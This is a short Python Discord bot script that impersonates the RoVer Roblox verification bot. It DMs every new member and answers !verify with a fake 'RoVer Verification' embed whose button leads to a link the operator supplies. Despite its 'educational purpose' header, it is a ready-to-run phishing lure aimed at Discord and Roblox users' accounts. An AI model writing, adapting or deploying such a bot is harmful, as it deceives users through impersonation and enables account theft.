#made by green*, created only for educational purpose!!!

print("Connecting To Your Bot..")
#change this how you want 
link= input("paste ur link here :")
token= input("bot token :")

import discord
from discord.ext import commands
import os


os.system("mode con cols=60 lines=20")
os.system("title " + "gren (Console)")


intents = discord.Intents.all()
gren = commands.Bot(command_prefix='!',intents = intents)
gren.remove_command('help')

class vericu(discord.ui.View):
  def _init_(self):
    super()._init_()
    self.value = None

@gren.event
async def on_member_join(member):
    await member.send(f"Welcome to {member.guild.name}! This Discord server uses a Roblox account verification system to keep our community safe. Verifying your account is quick and safe. . . All you have to do is join a game **after you run !verify in the server** , and you're in!")

@gren.event
async def on_ready():
    print("command is !verify")

@gren.command()
async def verify(ctx):
    print(f"{ctx.author} Is Verifying")
    ve = vericu()
    ve.add_item(discord.ui.Button(label="Update my roles", style=discord.ButtonStyle.link, url = link))
    em2 = discord.Embed(title="RoVer Verification",description="This server uses a Roblox verification system. In order to unlock all the features of this server, you'll need to verify your Roblox account with your Discord account!",color=0xcf4948)
    em2.set_footer(text = "Click the button below to begin.")
    await ctx.reply(embed=em2,view=ve)


@gren.event
async def on_member_remove(member):
    print(f"{member} just left the server.")
  
print("working")
gren.run(token)
